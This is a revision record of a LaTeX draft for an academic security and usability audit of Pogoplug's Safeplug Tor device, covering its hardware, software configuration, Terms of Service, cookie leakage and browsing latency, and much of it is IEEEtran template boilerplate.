 Pogoplug’s marketing pitch centers around the protection of user’s IP addresses by using Tor \cite{safeplug,bittech}.

### 2014-02-17 report/usability.tex
updated usability section

@@
 \item Firefox, no Tor, ad-blocking
-\item Tor Browser Bundle with Safeplug
+\item Tor Browser Bundle with Safeplug (all settings turned off)
 \item Tor Browser Bundle
@@
 The differences between web pages can most likely be attributed to the amount of ads on the web page.
-
-It is interesting to note that the average web request time for accessing \url{www.washingtonpost.com} is greatest on the same settings that the average web request time for \url{www.google.com} is the least.
-This setting did not include ad-blocking, and therefore \url{www.washingtonpost.com} had to render each ad; \url{www.google.com} does not have any ads.
-This does not explain why the average latency was greater than the other settings for \url{www.washingtonpost.com}.
-
-We expected the average latency for the Tor Browser Bundle with the Safeplug to be uniformly greater than the average latency of the Tor Browser Bundle, however that was not the case.
-[Comment: do we have any reasons why this might have happened?]
 
@@
 \end{figure}
+
+It is interesting to note that the average web request time for accessing \url{www.washingtonpost.com} is greatest on the same settings that the average web request time for \url{www.google.com} is the least.
+This setting did not include ad-blocking, and therefore \url{www.washingtonpost.com} had to render each ad; \url{www.google.com} does not have any ads.
+This also explains why the average latency was greater than the other settings for \url{www.washingtonpost.com}: each ad was requested through Tor.
+
+The latency of using the Safeplug with Firefox, Tor, and ad-blocking is comparable to that of using the Tor Browser Bundle.  For all three web pages, the Tor Browser Bundle had slightly lower latency.

### 2014-02-18 w2sp/bare_conf.tex
edited paper and added directory for w2sp

%% bare_conf.tex
%% V1.3
%% 2007/01/11
%% by Michael Shell
%% See:
%% http://www.michaelshell.org/
%% for current contact information.
%%
%% This is a skeleton file demonstrating the use of IEEEtran.cls
%% (requires IEEEtran.cls version 1.7 or later) with an IEEE conference paper.
%%
%% Support sites:
%% http://www.michaelshell.org/tex/ieeetran/
%% http://www.ctan.org/tex-archive/macros/latex/contrib/IEEEtran/
%% and
%% http://www.ieee.org/

%%*************************************************************************
%% Legal Notice:
%% This code is offered as-is without any warranty either expressed or
%% implied; without even the implied warranty of MERCHANTABILITY or
%% FITNESS FOR A PARTICULAR PURPOSE! 
%% User assumes all risk.
%% In no event shall IEEE or any contributor to this code be liable for
%% any damages or losses, including, but not limited to, incidental,
%% consequential, or any other damages, resulting from the use or misuse
%% of any information contained here.
%%
%% All comments are the opinions of their respective authors and are not
%% necessarily endorsed by the IEEE.
%%
%% This work is distributed under the LaTeX Project Public License (LPPL)
%% ( http://www.latex-project.org/ ) version 1.3, and may be freely used,
%% distributed and modified. A copy of the LPPL, version 1.3, is included
%% in the base LaTeX documentation of all distributions of LaTeX released
%% 2003/12/01 or later.
%% Retain all contribution notices and credits.
%% ** Modified files should be clearly indicated as such, including  **
%% ** renaming them and changing author support contact information. **
%%
%% File list of work: IEEEtran.cls, IEEEtran_HOWTO.pdf, bare_adv.tex,
%%                    bare_conf.tex, bare_jrnl.tex, bare_jrnl_compsoc.tex
%%*************************************************************************

% *** Authors should verify (and, if needed, correct) their LaTeX system  ***
% *** with the testflow diagnostic prior to trusting their LaTeX platform ***
% *** with production work. IEEE's font choices can trigger bugs that do  ***
% *** not appear when using other class files.                            ***
% The testflow support page is at:
% http://www.michaelshell.org/tex/testflow/

% Note that the a4paper option is mainly intended so that authors in
% countries using A4 can easily print to A4 and see how their papers will
% look in print - the typesetting of the document will not typically be
% affected with changes in paper size (but the bottom and side margins will).
% Use the testflow package mentioned above to verify correct handling of
% both paper sizes by the user's LaTeX system.
%
% Also note that the "draftcls" or "draftclsnofoot", not "draft", option
% should be used if it is desired that the figures are to be displayed in
% draft mode.
%
\documentclass[conference]{IEEEtran}
% Add the compsoc option for Computer Society conferences.
%
% If IEEEtran.cls has not been installed into the LaTeX system files,
% manually specify the path to it like:
% \documentclass[conference]{../sty/IEEEtran}

% Some very useful LaTeX packages include:
% (uncomment the ones you want to load)

% *** MISC UTILITY PACKAGES ***
%
%\usepackage{ifpdf}
% Heiko Oberdiek's ifpdf.sty is very useful if you need conditional
% compilation based on whether the output is pdf or dvi.
% usage:
% \ifpdf
%   % pdf code
% \else
%   % dvi code
% \fi
% The latest version of ifpdf.sty can be obtained from:
% http://www.ctan.org/tex-archive/macros/latex/contrib/oberdiek/
% Also, note that IEEEtran.cls V1.7 and later provides a builtin
% \ifCLASSINFOpdf conditional that works the same way.
% When switching from latex to pdflatex and vice-versa, the compiler may
% have to be run twice to clear warning/error messages.

% *** CITATION PACKAGES ***
%
%\usepackage{cite}
% cite.sty was written by Donald Arseneau
% V1.6 and later of IEEEtran pre-defines the format of the cite.sty package
% \cite{} output to follow that of IEEE. Loading the cite package will
% result in citation numbers being automatically sorted and properly
% "compressed/ranged". e.g., [1], [9], [2], [7], [5], [6] without using
% cite.sty will become [1], [2], [5]--[7], [9] using cite.sty. cite.sty's
% \cite will automatically add leading space, if needed. Use cite.sty's
% noadjust option (cite.sty V3.8 and later) if you want to turn this off.
% cite.sty is already installed on most LaTeX systems. Be sure and use
% version 4.0 (2003-05-27) and later if using hyperref.sty. cite.sty does
% not currently provide for hyperlinked citations.
% The latest version can be obtained at:
% http://www.ctan.org/tex-archive/macros/latex/contrib/cite/
% The documentation is contained in the cite.sty file itself.

% *** GRAPHICS RELATED PACKAGES ***
%
\ifCLASSINFOpdf
   \usepackage[pdftex]{graphicx}
  % declare the path(s) where your graphic files are
  % \graphicspath{{../pdf/}{../jpeg/}}
  % and their extensions so you won't have to specify these with
  % every instance of \includegraphics
  % \DeclareGraphicsExtensions{.pdf,.jpeg,.png}
\else
  % or other class option (dvipsone, dvipdf, if not using dvips). graphicx
  % will default to the driver specified in the system graphics.cfg if no
  % driver is specified.
  % \usepackage[dvips]{graphicx}
  % declare the path(s) where your graphic files are
  % \graphicspath{{../eps/}}
  % and their extensions so you won't have to specify these with
  % every instance of \includegraphics
  % \DeclareGraphicsExtensions{.eps}
\fi
% graphicx was written by David Carlisle and Sebastian Rahtz. It is
% required if you want graphics, photos, etc. graphicx.sty is already
% installed on most LaTeX systems. The latest version and documentation can
% be obtained at: 
% http://www.ctan.org/tex-archive/macros/latex/required/graphics/
% Another good source of documentation is "Using Imported Graphics in
% LaTeX2e" by Keith Reckdahl which can be found as epslatex.ps or
% epslatex.pdf at: http://www.ctan.org/tex-archive/info/
%
% latex, and pdflatex in dvi mode, support graphics in encapsulated
% postscript (.eps) format. pdflatex in pdf mode supports graphics
% in .pdf, .jpeg, .png and .mps (metapost) formats. Users should ensure
% that all non-photo figures use a vector format (.eps, .pdf, .mps) and
% not a bitmapped formats (.jpeg, .png). IEEE frowns on bitmapped formats
% which can result in "jaggedy"/blurry rendering of lines and letters as
% well as large increases in file sizes.
%
% You can find documentation about the pdfTeX application at:
% http://www.tug.org/applications/pdftex

% *** MATH PACKAGES ***
%
%\usepackage[cmex10]{amsmath}
% A popular package from the American Mathematical Society that provides
% many useful and powerful commands for dealing with mathematics. If using
% it, be sure to load this package with the cmex10 option to ensure that
% only type 1 fonts will utilized at all point sizes. Without this option,
% it is possible that some math symbols, particularly those within
% footnotes, will be rendered in bitmap form which will result in a
% document that can not be IEEE Xplore compliant!
%
% Also, note that the amsmath package sets \interdisplaylinepenalty to 10000
% thus preventing page breaks from occurring within multiline equations. Use:
%\interdisplaylinepenalty=2500
% after loading amsmath to restore such page breaks as IEEEtran.cls normally
% does. amsmath.sty is already installed on most LaTeX systems. The latest
% version and documentation can be obtained at:
% http://www.ctan.org/tex-archive/macros/latex/required/amslatex/math/

% *** SPECIALIZED LIST PACKAGES ***
%
%\usepackage{algorithmic}
% algorithmic.sty was written by Peter Williams and Rogerio Brito.
% This package provides an algorithmic environment fo describing algorithms.
% You can use the algorithmic environment in-text or within a figure
% environment to provide for a floating algorithm. Do NOT use the algorithm
% floating environment provided by algorithm.sty (by the same authors) or
% algorithm2e.sty (by Christophe Fiorio) as IEEE does not use dedicated
% algorithm float types and packages that provide these will not provide
% correct IEEE style captions. The latest version and documentation of
% algorithmic.sty can be obtained at:
% http://www.ctan.org/tex-archive/macros/latex/contrib/algorithms/
% There is also a support site at:
% http://algorithms.berlios.de/index.html
% Also of interest may be the (relatively newer and more customizable)
% algorithmicx.sty package by Szasz Janos:
% http://www.ctan.org/tex-archive/macros/latex/contrib/algorithmicx/

% *** ALIGNMENT PACKAGES ***
%
%\usepackage{array}
% Frank Mittelbach's and David Carlisle's array.sty patches and improves
% the standard LaTeX2e array and tabular environments to provide better
% appearance and additional user controls. As the default LaTeX2e table
% generation code is lacking to the point of almost being broken with
% respect to the quality of the end results, all users are strongly
% advised to use an enhanced (at the very least that provided by array.sty)
% set of table tools. array.sty is already installed on most systems. The
% latest version and documentation can be obtained at:
% http://www.ctan.org/tex-archive/macros/latex/required/tools/

%\usepackage{mdwmath}
%\usepackage{mdwtab}
% Also highly recommended is Mark Wooding's extremely powerful MDW tools,
% especially mdwmath.sty and mdwtab.sty which are used to format equations
% and tables, respectively. The MDWtools set is already installed on most
% LaTeX systems. The lastest version and documentation is available at:
% http://www.ctan.org/tex-archive/macros/latex/contrib/mdwtools/

% IEEEtran contains the IEEEeqnarray family of commands that can be used to
% generate multiline equations as well as matrices, tables, etc., of high
% quality.

%\usepackage{eqparbox}
% Also of notable interest is Scott Pakin's eqparbox package for creating
% (automatically sized) equal width boxes - aka "natural width parboxes".
% Available at:
% http://www.ctan.org/tex-archive/macros/latex/contrib/eqparbox/

% *** SUBFIGURE PACKAGES ***
\usepackage[tight,footnotesize]{subfig}
% subfigure.sty was written by Steven Douglas Cochran. This package makes it
% easy to put subfigures in your figures. e.g., "Figure 1a and 1b". For IEEE
% work, it is a good idea to load it with the tight package option to reduce
% the amount of white space around the subfigures. subfigure.sty is already
% installed on most LaTeX systems. The latest version and documentation can
% be obtained at:
% http://www.ctan.org/tex-archive/obsolete/macros/latex/contrib/subfigure/
% subfigure.sty has been superceeded by subfig.sty.

%\usepackage[caption=false]{caption}
%\usepackage[font=footnotesize]{subfig}

%\usepackage[caption=false]{subfig}
% subfig.sty, also written by Steven Douglas Cochran, is the modern
% replacement for subfigure.sty. However, subfig.sty requires and
% automatically loads Axel Sommerfeldt's caption.sty which will override
% IEEEtran.cls handling of captions and this will result in nonIEEE style
% figure/table captions. To prevent this problem, be sure and preload
% caption.sty with its "caption=false" package option. This is will preserve
% IEEEtran.cls handing of captions. Version 1.3 (2005/06/28) and later 
% (recommended due to many improvements over 1.2) of subfig.sty supports
% the caption=false option directly:
%\usepackage[caption=false,font=footnotesize]{subfig}
%
% The latest version and documentation can be obtained at:
% http://www.ctan.org/tex-archive/macros/latex/contrib/subfig/
% The latest version and documentation of caption.sty can be obtained at:
% http://www.ctan.org/tex-archive/macros/latex/contrib/caption/

% *** FLOAT PACKAGES ***
%
\usepackage{fixltx2e}
% fixltx2e, the successor to the earlier fix2col.sty, was written by
% Frank Mittelbach and David Carlisle. This package corrects a few problems
% in the LaTeX2e kernel, the most notable of which is that in current
% LaTeX2e releases, the ordering of single and double column floats is not
% guaranteed to be preserved. Thus, an unpatched LaTeX2e can allow a
% single column figure to be placed prior to an earlier double column
% figure. The latest version and documentation can be found at:
% http://www.ctan.org/tex-archive/macros/latex/base/

\usepackage{stfloats}
% stfloats.sty was written by Sigitas Tolusis. This package gives LaTeX2e
% the ability to do double column floats at the bottom of the page as well
% as the top. (e.g., "\begin{figure*}[!b]" is not normally possible in
% LaTeX2e). It also provides a command:
%\fnbelowfloat
% to enable the placement of footnotes below bottom floats (the standard
% LaTeX2e kernel puts them above bottom floats). This is an invasive package
% which rewrites many portions of the LaTeX2e float routines. It may not work
% with other packages that modify the LaTeX2e float routines. The latest
% version and documentation can be obtained at:
% http://www.ctan.org/tex-archive/macros/latex/contrib/sttools/
% Documentation is contained in the stfloats.sty comments as well as in the
% presfull.pdf file. Do not use the stfloats baselinefloat ability as IEEE
% does not allow \baselineskip to stretch. Authors submitting work to the
% IEEE should note that IEEE rarely uses double column equations and
% that authors should try to avoid such use. Do not be tempted to use the
% cuted.sty or midfloat.sty packages (also by Sigitas Tolusis) as IEEE does
% not format its papers in such ways.

% *** PDF, URL AND HYPERLINK PACKAGES ***
%
\usepackage{url}
% url.sty was written by Donald Arseneau. It provides better support for
% handling and breaking URLs. url.sty is already installed on most LaTeX
% systems. The latest version can be obtained at:
% http://www.ctan.org/tex-archive/macros/latex/contrib/misc/
% Read the url.sty source comments for usage information. Basically,
% \url{my_url_here}.

% *** Do not adjust lengths that control margins, column widths, etc. ***
% *** Do not use packages that alter fonts (such as pslatex).         ***
% There should be no need to do such things with IEEEtran.cls V1.6 and later.
% (Unless specifically asked to do so by the journal or conference you plan
% to submit to, of course. )

% correct bad hyphenation here
\hyphenation{op-tical net-works semi-conduc-tor}

\begin{document}
%
% paper title
% can use linebreaks \\ within to get better formatting as desired
\title{Security Audit of Safeplug}

% author names and affiliations
% use a multiple column layout for up to three different
% affiliations
%\author{\IEEEauthorblockN{Anne Edmundson}
%\IEEEauthorblockA{Department of Computer Science\\
%Princeton University\\
%Princeton, New Jersey 08540-5233\\
%Email: annee@cs.princeton.edu}
%\and
%\IEEEauthorblockN{Anna Kornfeld Simpson}
%\IEEEauthorblockA{Department of Computer Science\\
%Princeton University\\
%Princeton, New Jersey 08540-5233\\
%Email: aksimpso@princeton.edu}
%\and
%\IEEEauthorblockN{Josh Kroll}
%\IEEEauthorblockA{Department of Computer Science\\
%Princeton University\\
%Princeton, New Jersey 08540-5233\\
%Email: kroll@cs.princeton.edu}
%\and
%\IEEEauthorblockN{Ed Felten}
%\IEEEauthorblockA{Department of Computer Science\\
%Princeton University\\
%Princeton, New Jersey 08540-5233\\
%Email: felten@cs.princeton.edu}}

% conference papers do not typically use \thanks and this command
% is locked out in conference mode. If really needed, such as for
% the acknowledgment of grants, issue a \IEEEoverridecommandlockouts
% after \documentclass

% for over three affiliations, or if they all won't fit within the width
% of the page, use this alternative format:
% 
\author{\IEEEauthorblockN{Anna Kornfeld Simpson,
Anne Edmundson,
Josh Kroll and,
Ed Felten}
\IEEEauthorblockA{Department of Computer Science\\
Princeton University,
Princeton, NJ 08540-5233}}

% use for special paper notices
%\IEEEspecialpapernotice{(Invited Paper)}

% make the title area
\maketitle

\begin{abstract}
%\boldmath
We present the first public third-party security audit of Pogoplug's Safeplug device, which marketed ``complete security and anonymity online'' by using Tor technology to protect users' IP addresses.  We examine the hardware, software, and network behavior of the Safeplug device, as well as the user experience in comparison to other forms of web browsing.  Although the Safeplug appears to use Tor as advertised, lack of user education could easily allow users to be identified in ways that they might not expect.  Furthermore, an engineering vulnerability in the Safeplug's settings commands would allow an adversary internal or external to user's home network to silently disable Tor or modify other Safeplug settings, which completely overrules the security claims of the device.  Even if the engineering problem is fixed, the user experience challenges of this type of device make it inferior to the existing standard in anonymity methods, particularly the Tor Browser Bundle.
\end{abstract}
% IEEEtran.cls defaults to using nonbold math in the Abstract.
% This preserves the distinction between vectors and scalars. However,
% if the conference you are submitting to favors bold math in the abstract,
% then you can use LaTeX's standard command \boldmath at the very start
% of the abstract to achieve this. Many IEEE journals/conferences frown on
% math in the abstract anyway.

% no keywords

% For peer review papers, you can put extra information on the cover
% page as needed:
% \ifCLASSOPTIONpeerreview
% \begin{center} \bfseries EDICS Category: 3-BBND \end{center}
% \fi
%
% For peerreview papers, this IEEEtran command inserts a page break and
% creates the second title. It will be ignored for other modes.
\IEEEpeerreviewmaketitle

% An example of a floating figure using the graphicx package.
% Note that \label must occur AFTER (or within) \caption.
% For figures, \caption should occur after the \includegraphics.
% Note that IEEEtran v1.7 and later has special internal code that
% is designed to preserve the operation of \label within \caption
% even when the captionsoff option is in effect. However, because
% of issues like this, it may be the safest practice to put all your
% \label just after \caption rather than within \caption{}.
%
% Reminder: the "draftcls" or "draftclsnofoot", not "draft", class
% option should be used if it is desired that the figures are to be
% displayed while in draft mode.
%
%\begin{figure}[!t]
%\centering
%\includegraphics[width=2.5in]{myfigure}
% where an .eps filename suffix will be assumed under latex, 
% and a .pdf suffix will be assumed for pdflatex; or what has been declared
% via \DeclareGraphicsExtensions.
%\caption{Simulation Results}
%\label{fig_sim}
%\end{figure}

% Note that IEEE typically puts floats only at the top, even when this
% results in a large percentage of a column being occupied by floats.

% An example of a double column floating figure using two subfigures.
% (The subfig.sty package must be loaded for this to work.)
% The subfigure \label commands are set within each subfloat command, the
% \label for the overall figure must come after \caption.
% \hfil must be used as a separator to get equal spacing.
% The subfigure.sty package works much the same way, except \subfigure is
% used instead of \subfloat.
%
%\begin{figure*}[!t]
%\centerline{\subfloat[Case I]\includegraphics[width=2.5in]{subfigcase1}%
%\label{fig_first_case}}
%\hfil
%\subfloat[Case II]{\includegraphics[width=2.5in]{subfigcase2}%
%\label{fig_second_case}}}
%\caption{Simulation results}
%\label{fig_sim}
%\end{figure*}
%
% Note that often IEEE papers with subfigures do not employ subfigure
% captions (using the optional argument to \subfloat), but instead will
% reference/describe all of them (a), (b), etc., within the main caption.

% An example of a floating table. Note that, for IEEE style tables, the 
% \caption command should come BEFORE the table. Table text will default to
% \footnotesize as IEEE normally uses this smaller font for tables.
% The \label must come after \caption as always.
%
%\begin{table}[!t]
%% increase table row spacing, adjust to taste
%\renewcommand{\arraystretch}{1.3}
% if using array.sty, it might be a good idea to tweak the value of
% \extrarowheight as needed to properly center the text within the cells
%\caption{An Example of a Table}
%\label{table_example}
%\centering
%% Some packages, such as MDW tools, offer better commands for making tables
%% than the plain LaTeX2e tabular which is used here.
%\begin{tabular}{|c||c|}
%\hline
%One & Two\\
%\hline
%Three & Four\\
%\hline
%\end{tabular}
%\end{table}

\section{Introduction}
% no \IEEEPARstart
User privacy is becoming increasingly important as more Internet users realize how vulnerable they are to attackers and eavesdroppers.  This has been exacerbated by the current news about the NSA's surveillance of the Internet~\cite{nsa}.  Unfortunately, the average Internet user is not aware of how to protect themselves against malicious users.

\begin{figure*}[t]
\begin{center}
\includegraphics[width=.75\textwidth]{instructions}
\caption{Configuration instructions.}
\label{fig:instructions}
\end{center}
\end{figure*}

\section{Background}
{\bf Tor.} The state-of-the-art in online anonymity technology is the open-source project Tor.  Tor is a service that provides anonymous communication as an onion router; by encrypting internet traffic and sending it through layers of relays, a user can make it much more difficult to trace their internet use~\cite{tor}.  Instead of appearing to come from a user's IP address, the traffic will reach the destination from one of the relays, that will have received the traffic from another relay, creating a chain back from when the user first sent their traffic to a relay.  Tor is known as an onion router because each relay peels back one layer of encryption and no more, allowing it to send the traffic to the next destination but not allowing it to discover the origin or final recipient of the traffic.  Tor is open-source software developed by the Tor Project~\cite{torproject}.  Users of Tor are highly recommended to use it as part of the {\bf Tor Browser Bundle (TBB)}, which provides a single installation of a browser and the Tor software package.  This browser has special settings to prevent deanonymization of the traffic by other means, such as cookies, supercookies, or scripts~\cite{torproject}.

Using Tor or the Tor Browser Bundle provides a tradeoff between anonymity, usability, and efficiency.  Sending traffic to these relays around the world slows down the traffic significantly, possibly degrading user experience for websites that load a lot of data in real-time.  In addition, because the destination website will see the user's request as coming from a new, likely international IP address, websites such as banks that have location-based safeguards may deny users access to their sites.  For many users around the world, these troubles are a worthwhile price for access to free and open internet, anonymous communications, and resisting censorship.  However, one of the biggest reasons that Tor is not more widespread is that many Internet users do not know about Tor, how it works, or how they would be able to use it to become more anonymous online.

{\bf Safeplug.} Safeplug is a product that launched in December of 2013 from the cloud storage company Pogoplug, that offers any user the option of using Tor without having to know about it or how it works.  It allows users to browse the web from their own standard web browser with “complete security and anonymity” for the cheap price of \$49 \cite{safeplug}.  Safeplug offers Tor out of the box, with no additional software installation, by sitting between a user's router and the internet \cite{wired}.  Pogoplug’s marketing pitch centers around the protection of user’s IP addresses by using Tor \cite{safeplug,bittech}.

{\bf Pogoplug.} Pogoplug, a subsidary of Cloud Engines, also offers a box for home network file sharing without needing to use a third-party storage provider.  Based on our examination of the box discussed below, we suspect that the Pogoplug box was relabelled as Safeplug and just uses different software to achieve its newly branded purpose.

\section{Design and Operation of Safeplug}
\subsection{Hardware}
Before investigating the software, we took apart one of the two Safeplug devices we purchased in order to see the physical components.  Figure~\ref{fig:top} shows the top of the board and Figure~\ref{fig:bottom} shows the bottom.  The board incorporates: (A) an SD card slot, (B) a power connector, (C) a USB slot, (D) an ethernet connector, (E) ethernet transceiver, (F) lan transformer, (G) an integrated circuit, and (H), (I) flash memory.

%\begin{figure*}[htb]
%\centering
%\begin{subfigure}[b]{.3\textwidth}
%  \includegraphics[width=\textwidth]{safeplug_listed_top}
%  \caption{Top of the board inside the Safeplug device.}
%  \label{fig:top}
%\end{subfigure}%
%\qquad
%\begin{subfigure}[b]{.3\textwidth}
%\includegraphics[width=\textwidth]{safeplug_listed_bottom}
%\caption{Bottom of the board inside the Safeplug device.}
%\label{fig:bottom}
%\end{subfigure}
%\caption{Safeplug circuit board after the teardown.}
%\end{figure*}

\subsection{Software}
\label{software}
We determined the software on the device from analyzing network traffic logs of the activation process and accessing the device via SSH.

\subsection{Terms of Service}
\label{tos}
The Terms of Service (TOS) contains three main points of interest: TOS updates, open source licensing information, and software updates.

{\bf TOS updates.} Pogoplug suggests that users consistently read the TOS becaues they can update or change them at anytime.  Most Safeplug users will likely not read the TOS once, let alone on a regular basis; therefore, most users will be blind to any changes.  It is also interesting that these TOS are only accessible through a small link at the bottom of the Safeplug website \cite{safeplug}; specifically, there is no documentation, including the TOS, in the package that the device was shipped in.

{\bf Open source licensing information.}  There is a section that acknowledges the use of many open source components in the Safeplug device; this section includes the statement:

\begin{quotation}
``You agree to abide by the terms of the relevant licenses, as may be updated by Pogoplug from time to time at http://pogoplug.com/home-en-developers-open-source.html. '' \cite{safeplug}
\end{quotation}

The link included is a dead link and takes the user to a web page with a 404 error.  This lack of attention to detail or respect for open source licenses does not put Pogoplug in a good light.  In fact, the Tor-talk mailing list noted this particularly, since Tor is an open source project \cite{tormailinglist}.

{\bf Software updates.} Not only can the TOS be updated at any time, so can the software on the device.  These udpates will be ``automatically delivered'' to the user, but the user is not notified of these updates~\cite{safeplug}.  This should raise a red flag for users because they may not know when the software in their device is being changed or what it is changing to.  While Safeplug makes many claims about providing anonymity, users are simply putting their trust in a different entity, namely Pogoplug.

\subsection{Tor Relay Node Option}
One of Safeplug's configurations is the use of the device as a Tor relay node in the Tor network.  When the device is initially setup, the default setting is to not use it as a relay node.

One of our concerns is how understandable this setting is to the average Internet user.  The settings page describes Tor in an extremely basic way:

\begin{quotation}
``Safeplug uses the Tor network to secure your Internet connection.  Tor works by routing your Internet through a series of random destinations, much like driving a twisty, complicated route to throw off someone who is following you, making it impossible for websites and organizations to identify the source or destination of Internet traffic.'' \cite{safeplug}
\end{quotation}

On the other hand, it describes the functionality of a Tor relay node in a much more technical manner.  This description is shown in Figure~\ref{fig:relaydesc}.  If the majority of users can only understand the simpler description, then they likely won't understand the description of a Tor relay node.  This could be a problem if users simply decide not to do anything with that setting (i.e. don't change the setting to use Safeplug as a relay node).  Then there would be a large increase in use of the Tor network, yet most of the users are not giving back to it.

\begin{figure*}
\begin{center}
\includegraphics[width=\textwidth]{funnydesc.png}
\caption{Description of Tor on Safeplug settings page.}
\label{fig:funnydesc}
\end{center}
\end{figure*}

\begin{figure*}[th]
\begin{center}
\includegraphics[width=\textwidth]{relaydesc.png}
\caption{Description of a Tor relay on Safeplug settings page.}
\label{fig:relaydesc}
\end{center}
\end{figure*}

This could easily be remedied; Safeplug should choose a target audience and have consistent descriptions.  The best option is to explain the Tor network and the functionality of a Tor relay node at the same level, preferably a level that normal Internet users can understand.  This increases the chances that users will run their Safeplug as a relay node.

\subsection{Software on the Safeplug}
The software installed by the activation process on the Safeplug (it is not on the box prior to the activation) is in \verb!/opt/xce! and includes lighttpd, privoxy, and tor.  Lighttpd is an open-source webserver, which is serving the settings page on the device - the project's description mentions ``security, speed, compliance, and flexibility [... while being] designed and optimized for high perfomance environments'' \cite{lighttpd}.  Privoxy is a ``non-caching web proxy with advanced filtering capabilities for enhancing privacy, modifying webpage data and HTTP headers, controlling access, and removing ads and other obnoxious Internet junk'' and it specifically advertises its ``flexible configuration'' \cite{privoxy}.  Privoxy is also open source.  All three pieces of software appear to have default configuration files.  The fourth piece of software discovered on the device, which does not seem to be installed during the activation process is the Dropbear SSH server and client, used to support SSH access to the device \cite{dropbear}.  The Safeplug uses its own configuration files to determine how these pieces of software are set up and used.

\subsection{Configuration on the Safeplug}
\label{spconfig}
The Safeplug configuration files can be found in \verb!/opt/xce/etc! and include \verb!sp.conf! and \verb!sp_version! and \verb!sp_torexceptions!.  The first contains all of the important details from the configuration page (whether to use Tor, whether to be a relay, whether to adblock) as well as a hidden option about whether to be an exit relay for the Tor network.  This is not documented anywhere on the site, so enabling this option would likely require SSH access to discover it, thereby breaking the warranty, but it is interesting that this option is available.  The version file is likely used for updates, and the exceptions file is used by the privoxy configuation to control the whitelist of sites not to connect to via Tor.

These configuration files are read by the scripts in \verb!/opt/xce/etc/init.d! which enable lighttpd, privoxy, and tor.  As expected, Privoxy looks at the Tor, adblock and exceptions configurations, and Tor reads the \verb!sp.conf! file to set which Tor configuration file (regular, relay or exit relay) to use.

\section{Usability}
Many news articles were published to announce the release of the Safeplug in addition to a lengthy discussion on the Tor-talk mailing list~\cite{tormailinglist}.  There were many thoughts on the Terms of Service and the option to use the device as a Tor relay node; this inspired us to start our analysis with these items.

\subsection{Activation and Setup}
The first step was to plug Safeplug into our router and activate our device.  Our instructions are shown in Figure~\ref{fig:instructions}.  We followed them, activated our device, and then ended on the configurations page.  The configurations page has a combination of platforms and browsers, with a different set of proxy configuration instructions for each one.  It is interesting to note that the only platform options were: OSX, Windows, Android, and iOS.  Figure~\ref{fig:proxyconfig} shows our configuration.

\begin{figure*}[t]
\begin{center}
\includegraphics[width=.75\textwidth]{proxyconfig}
\caption{Proxy Configuration.}
\label{fig:proxyconfig}
\end{center}
\end{figure*}

After we finished our configuration, we were taken to our settings page.  This page is shown in Figure~\ref{fig:settings}.  This allowed us to turn Tor on/off, add white-listed websites, turn ad-blocking on/off, and turn the ability of our device to be a relay node on/off.

\begin{figure*}[htb]
\begin{center}
\includegraphics[width=.75\textwidth]{settings}
\caption{Settings page.}
\label{fig:settings}
\end{center}
\end{figure*}

\subsection{Internet Use}
\label{inetuse}
Figure~\ref{fig:before} shows what a web page looks like before turning Tor and ad-blocking on, while Figure~\ref{fig:after} shows the same website after turning Tor and ad-blocking on.  Both of these figures show our IP address in the top right corner; due to the change in IP address we can see that our traffic is being routed through Tor.

%\begin{figure}[htb]
%\centering
%\begin{subfigure}[b]{.4\textwidth}
%\includegraphics[width=\textwidth]{before}
%\caption{Web page before using Tor and ad-blocking.}
%\label{fig:before}
%\end{subfigure}%
%\quad
%\begin{subfigure}[b]{.4\textwidth}
%\includegraphics[width=\textwidth]{after}
%\caption{Web page after using Tor and ad-blocking.}
%\label{fig:after}
%\end{subfigure}
%\end{figure}

Next, we wanted to see how usable this would be to a normal Internet user.  A user would probably decide not to use Safeplug if they could not read their web pages (if they were not in their native language), or if they could not log into their accounts (some web sites will lock a user out if they try to log in from multiple countries in a short time period).  While browsing the Internet, we experienced some pages in German and Swedish, which is expected with Tor; if a user is not familiar with Tor, then they may just get frustrated and stop using Safeplug altogether.  We were also prompted with the page in Figure~\ref{fig:funnygoogle} when we tried to log into our Google account, indicating that Google noticed we were trying to login from different locations.

\begin{figure*}[htb]
\begin{center}
\includegraphics[width=0.5\textwidth]{funnygoogle}
\caption{Google's response after trying to log in.}
\label{fig:funnygoogle}
\end{center}
\end{figure*}

\subsection{Cookies}  
While browsing the Internet, we logged into a Google Account in a tab, and then subsequently went to a website that had the Google+ logo in a different tab.  When we clicked on the Google+ logo, it remember who we are; so we can confirm that we still have first-party cookies.  We experienced the same situation with Facebook and its corresponding ``like'' button.

This is clearly not the perfect ``anonymity'' that Safeplug promised in their publicity.  Although normal use does follow this model of persisting logged in status across browser tabs and sessions, a user concerned about anonymity and seeing each session coming up differently (German vs Swedish) might mistakenly believe that they do not have to log out of their social media accounts to preserve their anonymity when accessing other websites.

More interesting and damaging to the user's control over their anonymity would be third-party cookies because the user cannot remove those just by logging out.  It requires a trip to the browser settings to clear cookies (or not have them set in the first place).  We used the FourthParty plugin developed by Jonathan Mayer at Stanford to collect information about cookies and other browsing data during the client's use of the Safeplug \cite{fourthparty}.  When collecting data on the existence of third-party cookies, we analyzed two separate browsing sessions; they were both new sessions with no cookies.  One of the sessions used the ad-block feature of the Safeplug and the other did not.  After analyzing data from Fourthparty, we found many third-party cookies in both sessions.  These included cookies from: abmr.net, bizographics.com, krxd.net, and bluekai.com among many others.

\subsection{Latency}
If the latency of web requests using the Safeplug is noticeably longer than that of normal Internet use, users may be deterred from using the device.  Similarly, if turning Tor on, but not ad-blocking, adds a significant time delay, the user may only turn on the ad-blocking feature (without Tor).  We recorded the time for a web request on the following settings:

\begin{itemize}
\item Plain Firefox
\item Firefox, no Tor, no ad-blocking
\item Firefox, Tor, no ad-blocking
\item Firefox, Tor, ad-blocking
\item Firefox, no Tor, ad-blocking
\item Tor Browser Bundle with Safeplug (all settings turned off)
\item Tor Browser Bundle
\end{itemize}

For each of the settings, we took 20 measurements; Figure~\ref{fig:latency2} shows the average time of a web request on each of the specified settings for three different web pages.  When taking these measurements, we loaded the page, but did not scroll; in many cases more objects are loaded when scrolling down a page.  The differences between web pages can most likely be attributed to the amount of ads on the web page.

\begin{figure*}[htb]
\begin{center}
\includegraphics[width=0.7\textwidth]{latency2}
\caption{Latency of web requests.}
\label{fig:latency2}
\end{center}
\end{figure*}

It is interesting to note that the average web request time for accessing \url{www.washingtonpost.com} is greatest on the same settings that the average web request time for \url{www.google.com} is the least. This setting did not include ad-blocking, and therefore \url{www.washingtonpost.com} had to render each ad; \url{www.google.com} does not have any ads.  This also explains why the average latency was greater than the other settings for \url{www.washingtonpost.com}: each ad was requested through Tor.

